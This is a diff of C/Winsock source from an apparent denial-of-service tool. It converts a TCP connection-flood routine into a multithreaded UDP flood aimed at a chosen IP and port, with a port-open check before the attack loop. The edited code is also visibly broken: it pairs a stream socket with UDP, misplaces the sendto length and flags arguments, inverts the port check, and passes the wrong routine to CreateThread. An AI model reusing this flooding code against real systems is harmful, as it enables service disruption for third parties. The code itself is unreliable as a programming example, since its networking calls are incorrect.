@@ -12,13 +12,12 @@
 #include "AttackDOS.h"
 #include "PortScan.h"
 
-
-int FullTcpDosConnection(SOCKADDR_IN ServerAddr, char* ipAddress, UINT bufferSize) {
+int UdpDosConnection(SOCKADDR_IN ServerAddr, char* ipAddress, UINT bufferSize) {
     SOCKET SendingSocket;
     char* payloadBuffer = NULL;
 
     //SendingSocket = socket(AF_INET, SOCK_DGRAM , IPPROTO_TCP);
-    SendingSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    SendingSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_UDP);
     if (SendingSocket == INVALID_SOCKET) {
         PrintSocketError("Client: socket() failed! Error code");
         return FALSE;
@@ -35,10 +34,11 @@ int FullTcpDosConnection(SOCKADDR_IN ServerAddr, char* ipAddress, UINT bufferSiz
 
 
     // Send an initial buffer
-    iResult = send(SendingSocket, payloadBuffer, (int)bufferSize, 0);
+    // sendto(s, buf, recv_len, 0, (struct sockaddr*) &si_other, slen) 
+    iResult = sendto(SendingSocket, payloadBuffer, 0, (int)bufferSize, (SOCKADDR*)&ServerAddr, 0);
     if (iResult == SOCKET_ERROR) {
         PrintSocketError("Send failed with error");
-        PrintSocketError("send failed with error");
+        printf("send failed with error: %d\n", WSAGetLastError());
         closesocket(SendingSocket);
         return FALSE;
     }
@@ -47,47 +47,45 @@ int FullTcpDosConnection(SOCKADDR_IN ServerAddr, char* ipAddress, UINT bufferSiz
     return iResult;
 }
 
-DWORD WINAPI ThreadTcpFullDosConnection(LPVOID lpParam) {
+DWORD WINAPI ThreadUdpDosConnection(LPVOID lpParam) {
     PTHREAD_STRUCT_HTTP_DOS pThreadData = (PTHREAD_STRUCT_HTTP_DOS)lpParam;
     SOCKADDR_IN ServerAddr = pThreadData->ServerAddr;
     char* ipAddress = pThreadData->ipAddress;
     UINT bufferSize = pThreadData->bufferSize;
-    return FullTcpDosConnection(ServerAddr, ipAddress, bufferSize);
+    return UdpDosConnection(ServerAddr, ipAddress, bufferSize);
 }
 
-BOOL AttackFloodFullTcp(char* ipAddress, int port, int waitTime, UINT bufferSize, BOOL isMultith) {
+BOOL AttackFloodUDP(char* ipAddress, int port, int waitTime, UINT bufferSize, BOOL isMultith) {
     clock_t startTime = clock();
     clock_t currentTime = clock();
     SOCKADDR_IN ssin = InitSockAddr(ipAddress, port);
     THREAD_STRUCT_HTTP_DOS threadStructHttpDos = {
         .ServerAddr = ssin,
-
         .ipAddress = ipAddress,
         .bufferSize = bufferSize
     };
     int sizeDataSize = 0;
 
-    printf("[-] Attack Flooding with FULL TCP connection\n");
-
-    if (!scanPortOpenTCP(ipAddress, port, NULL)) {
+    if (scanPortOpenUDP(ipAddress, port, NULL)) {
         printf("[X] Port %i is CLOSE !\n", port);
         printf("[X] Unable to perform the DOS attack !\n\n");
         return FALSE;
-    } else
-        printf("[+] Port %i is OPEN !\n", port);
+    }else
+        printf("[X] Port %i is OPEN !\n", port);
+
 
     for (int i = 0; startTime + waitTime > currentTime; i++) {
         DWORD ThreadId = 0;
         if (isMultith) {
             // ERROR ???
 
-            HANDLE Thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FullTcpDosConnection, &ThreadTcpFullDosConnection, 0, &ThreadId);
+            HANDLE Thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UdpDosConnection, &ThreadUdpDosConnection, 0, &ThreadId);
             if (Thread != NULL) {
-                PrintMsgError2("Create Thread with id: %lu\n", ThreadId);
+                printf("Create Thread with id: %lu\n", ThreadId);
                 CloseHandle(Thread);
             }
         } else {
-            sizeDataSize += FullTcpDosConnection(ssin, ipAddress, bufferSize);
+            sizeDataSize += UdpDosConnection(ssin, ipAddress, bufferSize);
             printf("[i] Bytes Sent: %ld kb\r", sizeDataSize / 1000);
         }
         currentTime = clock();
